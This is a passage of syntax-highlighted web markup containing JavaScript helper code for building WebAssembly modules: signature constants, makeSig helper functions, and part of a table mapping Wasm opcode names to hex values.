punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_dd <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_l_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_f_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_d_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_iii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_l <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_li <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_lii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_d <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_dd <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_ddi <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_ii_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_iii_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_ii_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_iii_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_ii_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_iii_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_f <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_f_f <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_f_d <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_d_d <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_r_r <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_a_a <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_r <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_r <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_a <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_rr <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">,</span> kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_aa <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">,</span> kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_r_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_a_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_a_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_s_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmS128<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_s <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmS128<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token parameter">params<span class="token punctuation">,</span> results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">params</span><span class="token operator">:</span> params<span class="token punctuation">,</span> <span class="token literal-property property">results</span><span class="token operator">:</span> results <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeSig_v_x</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeSig_x_v</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeSig_v_xx</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeSig_r_v</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeSig_r_x</span><span class="token punctuation">(</span><span class="token parameter">r<span class="token punctuation">,</span> x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeSig_r_xx</span><span class="token punctuation">(</span><span class="token parameter">r<span class="token punctuation">,</span> x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Opcodes</span>      <span class="token keyword">const</span> kWasmOpcodes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">Unreachable</span><span class="token operator">:</span> <span class="token number">0x00</span><span class="token punctuation">,</span>        <span class="token literal-property property">Nop</span><span class="token operator">:</span> <span class="token number">0x01</span><span class="token punctuation">,</span>        <span class="token literal-property property">Block</span><span class="token operator">:</span> <span class="token number">0x02</span><span class="token punctuation">,</span>        <span class="token literal-property property">Loop</span><span class="token operator">:</span> <span class="token number">0x03</span><span class="token punctuation">,</span>        <span class="token literal-property property">If</span><span class="token operator">:</span> <span class="token number">0x04</span><span class="token punctuation">,</span>        <span class="token literal-property property">Else</span><span class="token operator">:</span> <span class="token number">0x05</span><span class="token punctuation">,</span>        <span class="token literal-property property">Try</span><span class="token operator">:</span> <span class="token number">0x06</span><span class="token punctuation">,</span>        <span class="token literal-property property">TryTable</span><span class="token operator">:</span> <span class="token number">0x1f</span><span class="token punctuation">,</span>        <span class="token literal-property property">ThrowRef</span><span class="token operator">:</span> <span class="token number">0x0a</span><span class="token punctuation">,</span>        <span class="token literal-property property">Catch</span><span class="token operator">:</span> <span class="token number">0x07</span><span class="token punctuation">,</span>        <span class="token literal-property property">Throw</span><span class="token operator">:</span> <span class="token number">0x08</span><span class="token punctuation">,</span>        <span class="token literal-property property">Rethrow</span><span class="token operator">:</span> <span class="token number">0x09</span><span class="token punctuation">,</span>        <span class="token literal-property property">CatchAll</span><span class="token operator">:</span> <span class="token number">0x19</span><span class="token punctuation">,</span>        <span class="token literal-property property">End</span><span class="token operator">:</span> <span class="token number">0x0b</span><span class="token punctuation">,</span>        <span class="token literal-property property">Br</span><span class="token operator">:</span> <span class="token number">0x0c</span><span class="token punctuation">,</span>        <span class="token literal-property property">BrIf</span><span class="token operator">:</span> <span class="token number">0x0d</span><span class="token punctuation">,</span>        <span class="token literal-property property">BrTable</span><span class="token operator">:</span> <span class="token number">0x0e</span><span class="token punctuation">,</span>        <span class="token literal-property property">Return</span><span class="token operator">:</span> <span class="token number">0x0f</span><span class="token punctuation">,</span>        <span class="token literal-property property">CallFunction</span><span class="token operator">:</span> <span class="token number">0x10</span><span class="token punctuation">,</span>        <span class="token literal-property property">CallIndirect</span><span class="token operator">:</span> <span class="token number">0x11</span><span class="token punctuation">,</span>        <span class="token literal-property property">ReturnCall</span><span class="token operator">:</span> <span class="token number">0x12</span><span class="token punctuation">,</span>        <span class="token literal-property property">ReturnCallIndirect</span><span class="token operator">:</span> <span class="token number">0x13</span><span class="token punctuation">,</span>        <span class="token literal-property property">CallRef</span><span class="token operator">:</span> <span class="token number">0x14</span><span class="token punctuation">,</span>        <span class="token literal-property property">ReturnCallRef</span><span class="token operator">:</span> <span class="token number">0x15</span><span class="token punctuation">,</span>        <span class="token literal-property property">NopForTestingUnsupportedInLiftoff</span><span class="token operator">:</span> <span class="token number">0x16</span><span class="token punctuation">,</span>        <span class="token literal-property property">Delegate</span><span class="token operator">:</span> <span class="token number">0x18</span><span class="token punctuation">,</span>        <span class="token literal-property property">Drop</span><span class="token operator">:</span> <span class="token number">0x1a</span><span class="token punctuation">,</span>        <span class="token literal-property property">Select</span><span class="token operator">:</span> <span class="token number">0x1b</span><span class="token punctuation">,</span>        <span class="token literal-property property">SelectWithType</span><span class="token operator">:</span> <span class="token number">0x1c</span><span class="token punctuation">,</span>        <span class="token literal-property property">LocalGet</span><span class="token operator">:</span> <span class="token number">0x20</span><span class="token punctuation">,</span>        <span class="token literal-property property">LocalSet</span><span class="token operator">:</span> <span class="token number">0x21</span><span class="token punctuation">,</span>        <span class="token literal-property property">LocalTee</span><span class="token operator">:</span> <span class="token number">0x22</span><span class="token punctuation">,</span>        <span class="token literal-property property">GlobalGet</span><span class="token operator">:</span> <span class="token number">0x23</span><span class="token punctuation">,</span>        <span class="token literal-property property">GlobalSet</span><span class="token operator">:</span> <span class="token number">0x24</span><span class="token punctuation">,</span>        <span class="token literal-property property">TableGet</span><span class="token operator">:</span> <span class="token number">0x25</span><span class="token punctuation">,</span>        <span class="token literal-property property">TableSet</span><span class="token operator">:</span> <span class="token number">0x26</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LoadMem</span><span class="token operator">:</span> <span class="token number">0x28</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem</span><span class="token operator">:</span> <span class="token number">0x29</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32LoadMem</span><span class="token operator">:</span> <span class="token number">0x2a</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64LoadMem</span><span class="token operator">:</span> <span class="token number">0x2b</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LoadMem8S</span><span class="token operator">:</span> <span class="token number">0x2c</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LoadMem8U</span><span class="token operator">:</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LoadMem16S</span><span class="token operator">:</span> <span class="token number">0x2e</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LoadMem16U</span><span class="token operator">:</span> <span class="token number">0x2f</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem8S</span><span class="token operator">:</span> <span class="token number">0x30</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem8U</span><span class="token operator">:</span> <span class="token number">0x31</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem16S</span><span class="token operator">:</span> <span class="token number">0x32</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem16U</span><span class="token operator">:</span> <span class="token number">0x33</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem32S</span><span class="token operator">:</span> <span class="token number">0x34</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LoadMem32U</span><span class="token operator">:</span> <span class="token number">0x35</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32StoreMem</span><span class="token operator">:</span> <span class="token number">0x36</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64StoreMem</span><span class="token operator">:</span> <span class="token number">0x37</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32StoreMem</span><span class="token operator">:</span> <span class="token number">0x38</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64StoreMem</span><span class="token operator">:</span> <span class="token number">0x39</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32StoreMem8</span><span class="token operator">:</span> <span class="token number">0x3a</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32StoreMem16</span><span class="token operator">:</span> <span class="token number">0x3b</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64StoreMem8</span><span class="token operator">:</span> <span class="token number">0x3c</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64StoreMem16</span><span class="token operator">:</span> <span class="token number">0x3d</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64StoreMem32</span><span class="token operator">:</span> <span class="token number">0x3e</span><span class="token punctuation">,</span>        <span class="token literal-property property">MemorySize</span><span class="token operator">:</span> <span class="token number">0x3f</span><span class="token punctuation">,</span>        <span class="token literal-property property">MemoryGrow</span><span class="token operator">:</span> <span class="token number">0x40</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Const</span><span class="token operator">:</span> <span class="token number">0x41</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Const</span><span class="token operator">:</span> <span class="token number">0x42</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Const</span><span class="token operator">:</span> <span class="token number">0x43</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Const</span><span class="token operator">:</span> <span class="token number">0x44</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Eqz</span><span class="token operator">:</span> <span class="token number">0x45</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Eq</span><span class="token operator">:</span> <span class="token number">0x46</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Ne</span><span class="token operator">:</span> <span class="token number">0x47</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LtS</span><span class="token operator">:</span> <span class="token number">0x48</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LtU</span><span class="token operator">:</span> <span class="token number">0x49</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32GtS</span><span class="token operator">:</span> <span class="token number">0x4a</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32GtU</span><span class="token operator">:</span> <span class="token number">0x4b</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LeS</span><span class="token operator">:</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32LeU</span><span class="token operator">:</span> <span class="token number">0x4d</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32GeS</span><span class="token operator">:</span> <span class="token number">0x4e</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32GeU</span><span class="token operator">:</span> <span class="token number">0x4f</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Eqz</span><span class="token operator">:</span> <span class="token number">0x50</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Eq</span><span class="token operator">:</span> <span class="token number">0x51</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Ne</span><span class="token operator">:</span> <span class="token number">0x52</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LtS</span><span class="token operator">:</span> <span class="token number">0x53</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LtU</span><span class="token operator">:</span> <span class="token number">0x54</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64GtS</span><span class="token operator">:</span> <span class="token number">0x55</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64GtU</span><span class="token operator">:</span> <span class="token number">0x56</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LeS</span><span class="token operator">:</span> <span class="token number">0x57</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64LeU</span><span class="token operator">:</span> <span class="token number">0x58</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64GeS</span><span class="token operator">:</span> <span class="token number">0x59</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64GeU</span><span class="token operator">:</span> <span class="token number">0x5a</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Eq</span><span class="token operator">:</span> <span class="token number">0x5b</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Ne</span><span class="token operator">:</span> <span class="token number">0x5c</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Lt</span><span class="token operator">:</span> <span class="token number">0x5d</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Gt</span><span class="token operator">:</span> <span class="token number">0x5e</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Le</span><span class="token operator">:</span> <span class="token number">0x5f</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Ge</span><span class="token operator">:</span> <span class="token number">0x60</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Eq</span><span class="token operator">:</span> <span class="token number">0x61</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Ne</span><span class="token operator">:</span> <span class="token number">0x62</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Lt</span><span class="token operator">:</span> <span class="token number">0x63</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Gt</span><span class="token operator">:</span> <span class="token number">0x64</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Le</span><span class="token operator">:</span> <span class="token number">0x65</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Ge</span><span class="token operator">:</span> <span class="token number">0x66</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Clz</span><span class="token operator">:</span> <span class="token number">0x67</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Ctz</span><span class="token operator">:</span> <span class="token number">0x68</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Popcnt</span><span class="token operator">:</span> <span class="token number">0x69</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Add</span><span class="token operator">:</span> <span class="token number">0x6a</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Sub</span><span class="token operator">:</span> <span class="token number">0x6b</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Mul</span><span class="token operator">:</span> <span class="token number">0x6c</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32DivS</span><span class="token operator">:</span> <span class="token number">0x6d</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32DivU</span><span class="token operator">:</span> <span class="token number">0x6e</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32RemS</span><span class="token operator">:</span> <span class="token number">0x6f</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32RemU</span><span class="token operator">:</span> <span class="token number">0x70</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32And</span><span class="token operator">:</span> <span class="token number">0x71</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Ior</span><span class="token operator">:</span> <span class="token number">0x72</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Xor</span><span class="token operator">:</span> <span class="token number">0x73</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Shl</span><span class="token operator">:</span> <span class="token number">0x74</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32ShrS</span><span class="token operator">:</span> <span class="token number">0x75</span><span class="token punctuation">,</span>        <span class="token literal-property 